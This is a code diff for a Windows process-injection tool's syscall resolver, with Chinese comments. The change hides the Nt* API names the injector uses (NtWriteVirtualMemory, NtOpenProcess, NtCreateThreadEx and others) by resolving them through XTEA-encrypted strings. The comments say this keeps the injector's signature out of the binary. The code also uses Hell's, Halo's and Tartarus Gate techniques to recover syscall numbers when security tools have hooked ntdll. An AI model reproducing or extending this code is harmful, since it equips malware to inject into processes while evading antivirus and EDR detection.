@@ -7,6 +7,8 @@
 #include "syscall_direct.h"
 #include "platform.h"
 #include "module_resolver.h"  // ★ BUILD 550: GetModuleBaseFromPEB + ModNameHash (替代 GetModuleHandleW)
+// ★ BUILD 551: STEALTH_GET_PROC_ADDRESS_NOREF (加密解析 Nt* API 名, 消除 .rdata 明文)
+#include "string_obfuscator.h"
 #include <winternl.h>
 #include <psapi.h>
 #include <initializer_list>
@@ -54,11 +56,10 @@ SyscallResolver& SyscallResolver::Instance() {
     return instance;
 }
 
-DWORD SyscallResolver::ExtractSyscallNumber(const char* funcName) {
-    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
-    if (!ntdll) return 0;
-
-    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
+// ★ BUILD 551: 改为接受 funcAddr (调用方用 STEALTH_GET_PROC_ADDRESS_NOREF 解析)
+//   原因: 旧版 const char* funcName 在调用点传入明文 "NtXxx" 字面量, 进入 .rdata
+//   修复: 调用方先用 STEALTH_GET_PROC_ADDRESS_NOREF 加密解析得到 funcAddr, 再传入
+DWORD SyscallResolver::ExtractSyscallNumber(BYTE* funcAddr) {
     if (!funcAddr) return 0;
 
     // 标准 x64 Nt* 函数开头: 4C 8B D1 (mov r10, rcx) + B8 XX XX XX XX (mov eax, SSN)
@@ -78,11 +79,8 @@ DWORD SyscallResolver::ExtractSyscallNumber(const char* funcName) {
     return 0;
 }
 
-bool SyscallResolver::IsStubHooked(const char* funcName) {
-    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
-    if (!ntdll) return true;
-
-    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
+// ★ BUILD 551: 同样改为接受 funcAddr
+bool SyscallResolver::IsStubHooked(BYTE* funcAddr) {
     if (!funcAddr) return true;
 
     // 正常 stub: mov r10, rcx; mov eax, SSN; ... → 指令 >= 14 字节到 syscall
@@ -175,11 +173,8 @@ DWORD SyscallResolver::ScanNearbySyscall(BYTE* targetAddr, int searchRange) {
     return 0;
 }
 
-DWORD SyscallResolver::RecoverSSNviaHalo(const char* funcName) {
-    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
-    if (!ntdll) return 0;
-
-    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
+// ★ BUILD 551: 改为接受 funcAddr (与 ExtractSyscallNumber/IsStubHooked 同策略)
+DWORD SyscallResolver::RecoverSSNviaHalo(BYTE* funcAddr) {
     if (!funcAddr) return 0;
 
     // 尝试在不同范围搜索
@@ -196,12 +191,22 @@ DWORD SyscallResolver::RecoverSSNviaHalo(const char* funcName) {
 bool SyscallResolver::InitializeHaloGate() {
     if (m_haloInitialized) return true;
 
-    // 对每个关键 SSN 检查是否被 Hook, 如果是则使用 Halo's Gate 恢复
-    const char* criticalFuncs[] = {
-        "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
-        "NtWriteVirtualMemory", "NtReadVirtualMemory",
-        "NtOpenProcess", "NtQuerySystemInformation",
-        "NtQueryInformationProcess", "NtClose"
+    // ★ BUILD 551: 用 STEALTH_GET_PROC_ADDRESS_NOREF 加密解析 8 个 Nt* API 地址
+    //   原因: 旧版 const char* criticalFuncs[] = {"NtAllocateVirtualMemory", ...}
+    //         在 .rdata 段留下 8 个明文 API 名, 暴露注入器特征
+    //   修复: 运行时 XTEA 解密 API 名到栈缓冲, GetProcAddress 解析后清零
+    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
+    if (!ntdll) return false;
+
+    BYTE* funcAddrs[8] = {
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtAllocateVirtualMemory")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtProtectVirtualMemory")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtWriteVirtualMemory")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtReadVirtualMemory")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtOpenProcess")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQuerySystemInformation")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQueryInformationProcess")),
+        reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtClose"))
     };
     DWORD* ssnFields[] = {
         &m_numbers.NtAllocateVirtualMemory, &m_numbers.NtProtectVirtualMemory,
@@ -211,9 +216,9 @@ bool SyscallResolver::InitializeHaloGate() {
     };
 
     for (int i = 0; i < 8; i++) {
-        if (IsStubHooked(criticalFuncs[i])) {
+        if (IsStubHooked(funcAddrs[i])) {
             // 被 Hook! 使用 Halo's Gate 恢复
-            *ssnFields[i] = RecoverSSNviaHalo(criticalFuncs[i]);
+            *ssnFields[i] = RecoverSSNviaHalo(funcAddrs[i]);
         }
     }
 
@@ -290,20 +295,23 @@ bool SyscallResolver::Initialize() {
     if (!ntdll) return false;
 
     // 1. 正常提取 SSN (Hell's Gate)
-    m_numbers.NtAllocateVirtualMemory   = ExtractSyscallNumber("NtAllocateVirtualMemory");
-    m_numbers.NtProtectVirtualMemory    = ExtractSyscallNumber("NtProtectVirtualMemory");
-    m_numbers.NtWriteVirtualMemory      = ExtractSyscallNumber("NtWriteVirtualMemory");
-    m_numbers.NtReadVirtualMemory       = ExtractSyscallNumber("NtReadVirtualMemory");
-    m_numbers.NtOpenProcess             = ExtractSyscallNumber("NtOpenProcess");
-    m_numbers.NtQuerySystemInformation  = ExtractSyscallNumber("NtQuerySystemInformation");
-    m_numbers.NtQueryInformationProcess = ExtractSyscallNumber("NtQueryInformationProcess");
-    m_numbers.NtClose                   = ExtractSyscallNumber("NtClose");
-    m_numbers.NtQueryVirtualMemory      = ExtractSyscallNumber("NtQueryVirtualMemory");
-    m_numbers.NtFreeVirtualMemory       = ExtractSyscallNumber("NtFreeVirtualMemory");
-    m_numbers.NtCreateThreadEx          = ExtractSyscallNumber("NtCreateThreadEx");
-    m_numbers.NtDelayExecution          = ExtractSyscallNumber("NtDelayExecution");
-    m_numbers.NtContinue                = ExtractSyscallNumber("NtContinue");
-    m_numbers.NtWaitForSingleObject     = ExtractSyscallNumber("NtWaitForSingleObject");
+    // ★ BUILD 551: 用 STEALTH_GET_PROC_ADDRESS_NOREF 加密解析 14 个 Nt* API 地址
+    //   原因: 旧版 ExtractSyscallNumber("NtXxx") 在 .rdata 留下 14 个明文 API 名
+    //   修复: 先加密解析得到 funcAddr, 再传入 ExtractSyscallNumber(BYTE*)
+    m_numbers.NtAllocateVirtualMemory   = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtAllocateVirtualMemory")));
+    m_numbers.NtProtectVirtualMemory    = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtProtectVirtualMemory")));
+    m_numbers.NtWriteVirtualMemory      = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtWriteVirtualMemory")));
+    m_numbers.NtReadVirtualMemory       = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtReadVirtualMemory")));
+    m_numbers.NtOpenProcess             = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtOpenProcess")));
+    m_numbers.NtQuerySystemInformation  = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQuerySystemInformation")));
+    m_numbers.NtQueryInformationProcess = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQueryInformationProcess")));
+    m_numbers.NtClose                   = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtClose")));
+    m_numbers.NtQueryVirtualMemory      = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQueryVirtualMemory")));
+    m_numbers.NtFreeVirtualMemory       = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtFreeVirtualMemory")));
+    m_numbers.NtCreateThreadEx          = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtCreateThreadEx")));
+    m_numbers.NtDelayExecution          = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtDelayExecution")));
+    m_numbers.NtContinue                = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtContinue")));
+    m_numbers.NtWaitForSingleObject     = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtWaitForSingleObject")));
 
     // 2. 检查关键函数是否被 Hook, 必要时启用 Halo's Gate
     // (延迟到首次实际调用时, 避免在初始化阶段触发表征)
@@ -673,10 +681,19 @@ SyscallMethod DecideMethod(SyscallMethod requested) {
     auto& resolver = SyscallResolver::Instance();
 
     // 检查是否有被 Hook 的函数
+    // ★ BUILD 551: 用 STEALTH_GET_PROC_ADDRESS_NOREF 加密解析 3 个 Nt* API 地址
+    //   原因: 旧版 const char* checks[] = {"NtWriteVirtualMemory", ...} 在 .rdata 留下明文
     bool anyHooked = false;
-    const char* checks[] = {"NtWriteVirtualMemory", "NtReadVirtualMemory", "NtOpenProcess"};
-    for (auto* fn : checks) {
-        if (resolver.IsStubHooked(fn)) { anyHooked = true; break; }
+    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
+    if (ntdll) {
+        BYTE* checkAddrs[3] = {
+            reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtWriteVirtualMemory")),
+            reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtReadVirtualMemory")),
+            reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtOpenProcess"))
+        };
+        for (auto* addr : checkAddrs) {
+            if (resolver.IsStubHooked(addr)) { anyHooked = true; break; }
+        }
     }
 
     if (anyHooked) {
@@ -1064,7 +1081,7 @@ NTSTATUS SysAllocateVirtualMemory(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtAllocateVirtualMemory"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtAllocateVirtualMemory"));
         return fn ? fn(hProcess, baseAddr, zeroBits, regionSize, allocType, protect) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
@@ -1096,7 +1113,7 @@ NTSTATUS SysProtectVirtualMemory(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtProtectVirtualMemory"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtProtectVirtualMemory"));
         return fn ? fn(hProcess, baseAddr, regionSize, newProtect, oldProtect) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
@@ -1128,7 +1145,7 @@ NTSTATUS SysWriteVirtualMemory(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtWriteVirtualMemory"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtWriteVirtualMemory"));
         return fn ? fn(hProcess, baseAddr, buffer, bytesToWrite, bytesWritten) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
@@ -1160,7 +1177,7 @@ NTSTATUS SysReadVirtualMemory(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtReadVirtualMemory"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtReadVirtualMemory"));
         return fn ? fn(hProcess, baseAddr, buffer, bytesToRead, bytesRead) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
@@ -1192,7 +1209,7 @@ NTSTATUS SysOpenProcess(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtOpenProcess"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtOpenProcess"));
         return fn ? fn(hProcess, desiredAccess, objAttr, clientId) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
@@ -1224,7 +1241,7 @@ NTSTATUS SysQuerySystemInformation(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQuerySystemInformation"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQuerySystemInformation"));
         return fn ? fn(infoClass, info, infoLen, returnLen) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
@@ -1256,7 +1273,7 @@ NTSTATUS SysQueryInformationProcess(
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationProcess"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationProcess"));
         return fn ? fn(hProcess, infoClass, info, infoLen, returnLen) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
@@ -1285,7 +1302,7 @@ NTSTATUS SysClose(HANDLE handle, SyscallMethod method) {
     if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
     if (!stub) {
         using Fn = NTSTATUS(NTAPI*)(HANDLE);
-        auto fn = reinterpret_cast<Fn>(GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtClose"));
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtClose"));
         return fn ? fn(handle) : STATUS_NOT_SUPPORTED;
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE);
